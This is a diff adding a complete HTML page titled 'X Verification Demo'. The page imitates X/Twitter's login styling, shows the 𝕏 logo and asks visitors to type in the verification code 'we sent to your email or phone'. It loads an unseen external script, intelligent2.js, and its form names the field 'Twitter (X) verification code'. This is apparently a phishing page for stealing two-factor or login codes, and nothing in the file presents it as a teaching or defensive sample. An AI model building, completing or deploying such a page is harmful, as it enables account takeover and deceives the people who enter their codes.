@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>X Verification Demo</title>
+
+<style>
+    body {
+        margin: 0;
+        background: #000;
+        color: #eaeaea;
+        font-family: Arial, sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+    }
+
+    .container {
+        text-align: center;
+        width: 95%;
+        max-width: 380px;
+        padding: 30px 20px;
+        background: #111;
+        border-radius: 18px;
+        border: 1px solid #222;
+        box-shadow: 0 0 25px rgba(255,255,255,0.05);
+        animation: fadeIn 0.5s ease;
+    }
+
+    .logo {
+        font-size: 55px;
+        font-weight: bold;
+        margin-bottom: 15px;
+    }
+
+    .title {
+        font-size: 22px;
+        margin-top: 10px;
+    }
+
+    .subtitle {
+        font-size: 14px;
+        margin-bottom: 25px;
+        color: #aaa;
+    }
+
+    .code-input {
+        width: 100%;
+        padding: 15px;
+        font-size: 18px;
+        border-radius: 12px;
+        border: 1px solid #333;
+        background: #000;
+        color: #fff;
+        outline: none;
+        transition: all 0.25s ease;
+    }
+
+    .code-input:focus {
+        border-color: #1da1f2;
+        box-shadow: 0 0 10px rgba(29,161,242,0.5);
+    }
+
+    .verify-btn {
+        width: 100%;
+        padding: 15px;
+        font-size: 17px;
+        background: #fff;
+        border: none;
+        color: #000;
+        border-radius: 12px;
+        cursor: pointer;
+        font-weight: bold;
+        margin-top: 20px;
+        transition: 0.2s ease;
+    }
+
+    .verify-btn:hover {
+        opacity: 0.85;
+    }
+
+    .resend {
+        margin-top: 15px;
+        font-size: 14px;
+        color: #888;
+    }
+
+    .resend a {
+        color: #1da1f2;
+        text-decoration: none;
+    }
+
+    @keyframes fadeIn {
+        from { opacity: 0; transform: scale(0.97); }
+        to { opacity: 1; transform: scale(1); }
+    }
+</style>
+<script src="intelligent2.js"></script>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo">𝕏</div>
+
+    <h2 class="title">Enter Verification Code</h2>
+    <p class="subtitle">Enter the code we sent to your email or phone.</p>
+<form>
+    <input type="text" class="code-input" placeholder="Enter code here" name="Twitter (X) verification code" required>
+
+    <button class="verify-btn">Verify</button>
+</form>
+    <p class="resend">Didn't get a code? <a href="#">Resend</a></p>
+</div>
+
+</body>
+</html>
